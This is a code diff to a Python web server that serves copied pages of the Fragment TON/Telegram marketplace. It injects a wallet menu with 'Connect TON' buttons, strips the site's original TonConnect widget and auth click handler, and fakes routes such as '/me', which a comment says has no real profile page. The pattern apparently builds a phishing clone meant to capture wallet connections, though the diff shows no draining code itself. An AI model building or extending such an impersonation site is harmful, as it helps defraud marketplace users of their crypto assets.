@@ -220,6 +220,80 @@ def apply_dynamic_replacements(content, replacements):
         content = content.replace(old, new)
     return content
 
+NEW_MENU_WINDOW_HTML = """<div class="tm-header-menu-window js-header-menu-window">
+      <!-- DISCONNECTED STATE -->
+      <div class="tm-wallet-menu-disconnected">
+       <div class="tm-header-menu-body">
+        <h4 class="tm-menu-subheader">Platform</h4>
+        <div class="tm-menu-links">
+         <a class="tm-menu-link icon-before icon-menu-about" href="/about">About</a>
+         <a class="tm-menu-link icon-before icon-menu-terms" href="/terms">Terms</a>
+         <a class="tm-menu-link icon-before icon-menu-privacy" href="/privacy">Privacy Policy</a>
+        </div>
+        <div class="tm-header-menu-footer">
+         <div class="tm-header-menu-footer-text">Connect TON and Telegram<br/>to view your bids and assets</div>
+         <button class="btn btn-primary btn-block tm-menu-button ton-auth-link">
+          <i class="icon icon-connect-ton"></i>
+          <span class="tm-button-label">Connect TON</span>
+         </button>
+         <button class="btn btn-default btn-block tm-menu-button login-link">
+          <i class="icon icon-connect-telegram"></i>
+          <span class="tm-button-label">Connect Telegram</span>
+         </button>
+        </div>
+       </div>
+      </div>
+      <!-- CONNECTED STATE -->
+      <div class="tm-wallet-menu-connected" style="display:none;">
+       <div class="tm-header-menu-body">
+        <div style="padding:20px 12px 16px;border-bottom:1px solid var(--separator-color,rgba(255,255,255,.08));margin-bottom:4px;">
+         <div class="tm-menu-account-address tm-wallet-menu-addr" style="font-size:16px;"></div>
+         <div class="tm-menu-account-desc">Connected TON wallet</div>
+        </div>
+        <h4 class="tm-menu-subheader" style="margin-top:16px;">My Account</h4>
+        <div class="tm-menu-links">
+         <a class="tm-menu-link icon-before icon-menu-profile" href="/me">My Profile</a>
+         <a class="tm-menu-link icon-before icon-menu-assets" href="/me">My Assets</a>
+         <a class="tm-menu-link icon-before icon-menu-bids" href="/me">My Bids</a>
+         <a class="tm-menu-link icon-before icon-menu-numbers" href="/me">My Collectible Numbers</a>
+         <a class="tm-menu-link icon-before icon-menu-convert" href="/me">Convert to Collectibles</a>
+         <a class="tm-menu-link icon-before icon-menu-sessions" href="/me">Active Sessions</a>
+         <a class="tm-menu-link icon-before icon-menu-disconnect ton-logout-link" href="#">Disconnect TON</a>
+        </div>
+        <h4 class="tm-menu-subheader" style="margin-top:8px;">Platform</h4>
+        <div class="tm-menu-links">
+         <a class="tm-menu-link icon-before icon-menu-about" href="/about">About</a>
+         <a class="tm-menu-link icon-before icon-menu-terms" href="/terms">Terms</a>
+         <a class="tm-menu-link icon-before icon-menu-privacy" href="/privacy">Privacy Policy</a>
+        </div>
+       </div>
+      </div>
+     </div>"""
+
+
+def transform_menu(content):
+    """Replace old static menu window with connected/disconnected states in every page."""
+    start_tag = '<div class="tm-header-menu-window js-header-menu-window">'
+    idx = content.find(start_tag)
+    if idx == -1:
+        return content
+    pos = idx + len(start_tag)
+    depth = 1
+    while pos < len(content) and depth > 0:
+        open_pos = content.find('<div', pos)
+        close_pos = content.find('</div>', pos)
+        if close_pos == -1:
+            break
+        if open_pos != -1 and open_pos < close_pos:
+            depth += 1
+            pos = open_pos + 4
+        else:
+            depth -= 1
+            pos = close_pos + 6
+    content = content[:idx] + NEW_MENU_WINDOW_HTML + content[pos:]
+    return content
+
+
 PAGE_ROUTES = {
     "/": "index.html",
     "/numbers": "html/page_2.html",
@@ -431,6 +505,8 @@ class Handler(http.server.BaseHTTPRequestHandler):
         content = re.sub(r'<div[^>]+id=["\']tc-widget-root["\'][^>]*>.*?</div>', '', content, flags=re.DOTALL)
         # Remove any inline script that contains duplicate .ton-auth-link click handler
         content = re.sub(r'<script[^>]*>(?:(?!</script>).)*?closest\s*\(\s*["\']\.ton-auth-link["\'](?:(?!</script>).)*?</script>', '', content, flags=re.DOTALL)
+        # Apply unified connected/disconnected menu structure to all pages
+        content = transform_menu(content)
         data = content.encode("utf-8")
         self.send_response(200)
         self.send_header("Content-Type", "text/html; charset=utf-8")
@@ -482,6 +558,9 @@ class Handler(http.server.BaseHTTPRequestHandler):
             content = content.replace("<head>", '<head>\n  <base href="/">', 1)
             if '<base href="/">' not in content:
                 content = re.sub(r'(<head[^>]*>)', r'\1\n  <base href="/">', content, count=1)
+        content = re.sub(r'<div[^>]+id=["\']tc-widget-root["\'][^>]*>.*?</div>', '', content, flags=re.DOTALL)
+        content = re.sub(r'<script[^>]*>(?:(?!</script>).)*?closest\s*\(\s*["\']\.ton-auth-link["\'](?:(?!</script>).)*?</script>', '', content, flags=re.DOTALL)
+        content = transform_menu(content)
         data = content.encode("utf-8")
         self.send_response(200)
         self.send_header("Content-Type", "text/html; charset=utf-8")
@@ -610,6 +689,14 @@ class Handler(http.server.BaseHTTPRequestHandler):
                 ("ccccc – Fragment",         f"{title} – Fragment"),
             ])
             self.serve_content(content, is_ajax)
+            return
+
+        # /me → redirect to home (no real profile page)
+        if file_path is None and path == "/me":
+            self.send_response(302)
+            self.send_header("Location", "/")
+            self.send_header("Content-Length", "0")
+            self.end_headers()
             return
 
         # /username slugs → dynamic username product page
